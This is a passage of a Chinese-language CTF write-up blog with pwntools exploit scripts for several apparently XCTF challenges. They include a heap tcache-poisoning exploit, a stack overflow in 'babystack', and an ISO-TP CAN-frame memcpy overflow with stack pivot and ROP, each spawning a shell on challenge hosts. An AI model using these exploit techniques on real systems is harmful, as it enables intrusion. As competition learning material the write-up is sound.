class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;1.1.11 123&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;qemu-aarch64-static -L ./lib/ ./vuln&#x27;</span></span><br><span class="line"><span class="comment">#cmd = &#x27;qemu-aarch64-static -g 1234 -L ./lib/ ./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line">context(binary=binary, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(cmd.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#io = remote(&quot;pwn-e45167b3ab.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn-7ad75533cf.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    ru(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index : &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    ru(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    ru(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    s(text)</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    ru(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">key = uu64(r(<span class="number">6</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">0xC</span></span><br><span class="line"></span><br><span class="line">lss(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">lss(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64((heap_base-<span class="number">0x90</span>) ^ key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>)</span><br><span class="line">pay = p64(heap_base-<span class="number">0xF0</span>)</span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">elf_base = uu64(r(<span class="number">8</span>)) - <span class="number">0x2688</span></span><br><span class="line">lss(<span class="string">&#x27;elf_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t2 = elf_base + <span class="number">0x15F28</span></span><br><span class="line"></span><br><span class="line">pay = p64(t2)</span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">8</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">lss(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">t3 = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pay = p64(t3)</span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">stack = uu64(r(<span class="number">8</span>))</span><br><span class="line">lss(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t4 = heap_base - <span class="number">0x150</span></span><br><span class="line">t4 = stack - <span class="number">0x218</span></span><br><span class="line">pay = p64(t4)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">4</span>,asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay  = p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(heap_base+<span class="number">0x1c0</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#target = heap_base + 0x1c0</span></span><br><span class="line"><span class="comment">#add(4,0x80)</span></span><br><span class="line"><span class="comment">#pay = p64(target+8)</span></span><br><span class="line"><span class="comment">#pay += b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#pay += b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#pay += b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#pay += p64(target+8)</span></span><br><span class="line"><span class="comment">#pay += p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line"><span class="comment">#edit(4,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##pay  = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">##pay += p64(target)</span></span><br><span class="line"><span class="comment">##pay += asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">##edit(0,pay)</span></span><br><span class="line"><span class="comment">##print(n)</span></span><br><span class="line"><span class="comment">##pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,0x78)</span></span><br><span class="line"><span class="comment">#add(5,0x78)</span></span><br><span class="line"><span class="comment">#rm(4)</span></span><br><span class="line"><span class="comment">#rm(5)</span></span><br><span class="line"><span class="comment">#edit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rm(0)</span></span><br><span class="line"><span class="comment">#rm(1)</span></span><br><span class="line"><span class="comment">#show(0)</span></span><br><span class="line"><span class="comment">#ru(&#x27;Data: &#x27;)</span></span><br><span class="line"><span class="comment">#key = uu64(r(6))</span></span><br><span class="line"><span class="comment">#heap_base = key &lt;&lt; 0xC</span></span><br><span class="line"><span class="comment">#lss(&#x27;heap_base&#x27;)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2><span id="babystack">babystack</span><a href="#babystack" class="header-anchor"></a></h2><p>程序逻辑如下，可以通过第二次输入将n180097847覆盖，然后直接getshell</p>
<p><img src="../images/2025-QWNT/50.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">file=<span class="string">&#x27;./babystack&#x27;</span></span><br><span class="line">elf=ELF(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">choice = <span class="number">0x001</span></span><br><span class="line"><span class="keyword">if</span> choice:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-11b07bf3af.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> x,data             :p.sendafter(x, data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> x,data             :p.sendlineafter(x, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uru64   = <span class="keyword">lambda</span>                    :uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">leak    = <span class="keyword">lambda</span> name               :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(<span class="built_in">eval</span>(name))))</span><br><span class="line">libc_os   = <span class="keyword">lambda</span> x                :libc_base + x</span><br><span class="line">clear       =       <span class="keyword">lambda</span>                            : os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span>  </span><br><span class="line">        gdb.attach(p,gdbscript=cmd)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;Enter your flag1:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;Enter your flag2:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x108</span>-<span class="number">0x10</span>) + p64(<span class="number">0x1337abc</span>))</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1><span id="che-lian-wang">车联网</span><a href="#che-lian-wang" class="header-anchor"></a></h1><h2><span id="can">Can</span><a href="#can" class="header-anchor"></a></h2><p>沙箱</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="string">line</span>  <span class="string">CODE</span>  <span class="string">JT</span>   <span class="string">JF</span>      <span class="string">K</span></span><br><span class="line"><span class="string">=================================</span></span><br><span class="line"> <span class="attr">0000:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">arch</span></span><br><span class="line"> <span class="attr">0001:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="string">ARCH_X86_64)</span> <span class="string">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="attr">0002:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">sys_number</span></span><br><span class="line"> <span class="attr">0003:</span> <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">&lt;</span> <span class="number">0x40000000</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="attr">0004:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="number">0xffffffff</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="attr">0005:</span> <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execve)</span> <span class="string">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="attr">0006:</span> <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execveat)</span> <span class="string">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="attr">0007:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="string">return</span> <span class="string">ALLOW</span></span><br><span class="line"> <span class="attr">0008:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">return</span> <span class="string">KILL</span></span><br></pre></td></tr></table></figure>

<p>大概分析一下逻辑，先是一个密码</p>
<p><img src="../images/2025-QWNT/51.png" alt="img"></p>
<p>然后可以输入指令，但这上面这几个指令都没什么用。主要是下面的逻辑，我们可以发送3种类型的 ISO-TP 帧</p>
<ul>
<li>SF - 单帧 </li>
<li>FF - 首帧  <ul>
<li>输入<code>1#10xxxx</code></li>
</ul>
</li>
<li>CF - 连续帧 <ul>
<li>连续输入 <code>1#21...</code>、<code>1#22...</code>、<code>1#23...</code> 到了f就再回到1</li>
</ul>
</li>
</ul>
<p>大概尝试了一下，可以利用处理 CF 帧的这个 if 判断来泄露 pie</p>
<p><img src="../images/2025-QWNT/52.png" alt="img"></p>
<p>没细看处理的逻辑，但大概尝试了一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;Enter magic number:\n&#x27;</span>,<span class="string">&#x27;12803159&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#1020414141414141&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2142424242424242&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2243434343434343&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2344444444444444&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2445454545454545&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2445454545454545&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>就能执行到这个else分支，应该是输入的 CF 帧不合法导致的</p>
<p>值得注意的是这个函数</p>
<p><img src="../images/2025-QWNT/53.png" alt="img"></p>
<p>memcpy没有对长度进行判断，当满足条件的时候就会执行下面这个 p_sub_16E0, 存放在 buf_ + 0x100 的位置</p>
<p><img src="../images/2025-QWNT/54.png" alt="img"></p>
<p>可以先发送一个 FF 帧，例如：发送 <code>1#1008...</code>, 发这个帧是为了设定 ::n 的大小 , 由1#1后面的三个数字来决定，这个例子中  ::n 会被设定为 8。</p>
<p>泄露出 pie_base 之后需要重新设置 FF 帧，把ret写到开头，接着就利用 CF 帧的memcpy布置rop链来泄露libc。这里rop链的结构是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br><span class="line">puts(fgets_got)</span><br><span class="line">pop_rbp_ret</span><br><span class="line">bss_addr</span><br><span class="line">.text:000000000000130F                 mov     rdx, cs:stdin   ; stream</span><br><span class="line">.text:0000000000001316                 mov     esi, 200h       ; n</span><br><span class="line">.text:000000000000131B                 mov     rdi, rbp        ; s</span><br><span class="line">.text:000000000000131E                 call    _fgets</span><br></pre></td></tr></table></figure>

<p>然后我们把 p_sub_16E0 覆盖成这个gadget <code>push rdi ; pop rsp ; ret</code>。因为执行 p_sub_16E0 之前寄存器的状态是这样的</p>
<p><img src="../images/2025-QWNT/54.png" alt="img"></p>
<p>用这个gadget就能把栈迁移到bss段上，最后通过fgets的溢出来布置orw的rop链即可</p>
<p>大概泄露了一下远程的libc</p>
<p><img src="../images/2025-QWNT/55.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">file=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.39-0ubuntu8.6_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">choice = <span class="number">0x001</span></span><br><span class="line"><span class="keyword">if</span> choice:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-13470b3c3e.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> x,data             :p.sendafter(x, data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> x,data             :p.sendlineafter(x, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uru64   = <span class="keyword">lambda</span>                    :uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">leak    = <span class="keyword">lambda</span> name               :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(<span class="built_in">eval</span>(name))))</span><br><span class="line">libc_os   = <span class="keyword">lambda</span> x                :libc_base + x</span><br><span class="line">clear       =       <span class="keyword">lambda</span>                            : os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span>  </span><br><span class="line">        gdb.attach(p,gdbscript=cmd)</span><br><span class="line"></span><br><span class="line">commend = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x0000000000001A6B)</span></span><br><span class="line"><span class="string">b *$rebase(0x000000000000131E)</span></span><br><span class="line"><span class="string">b _IO_getline</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Enter magic number:\n&#x27;</span>,<span class="string">&#x27;12803159&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#11ff414141414141&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1#2445454545454545&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27; handler=&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(rl()[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x00000000000018C0</span></span><br><span class="line">elf.address = pie_base</span><br><span class="line">leak(<span class="string">&#x27;pie_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span> </span><br><span class="line">ret_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, ret)</span><br><span class="line"></span><br><span class="line">rdi = pie_base + <span class="number">0x0000000000001557</span></span><br><span class="line">rdi_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, rdi)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">puts_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, puts_got)</span><br><span class="line"></span><br><span class="line">fgets_got = elf.got.fgets</span><br><span class="line">fgets_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, fgets_got)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_p = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, puts_plt)</span><br><span class="line"></span><br><span class="line">set_puts = pie_base + <span class="number">0x0000000000016F0</span></span><br><span class="line">set_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, set_puts)</span><br><span class="line"></span><br><span class="line">pop_rbp = pie_base + <span class="number">0x0000000000001693</span></span><br><span class="line">pop_rbp = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, pop_rbp)</span><br><span class="line"></span><br><span class="line">main = pie_base + <span class="number">0x000000000000130F</span></span><br><span class="line">main_b = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, main)</span><br><span class="line"></span><br><span class="line">input_addr = pie_base + <span class="number">0x6088</span></span><br><span class="line">input_addr = struct.pack(<span 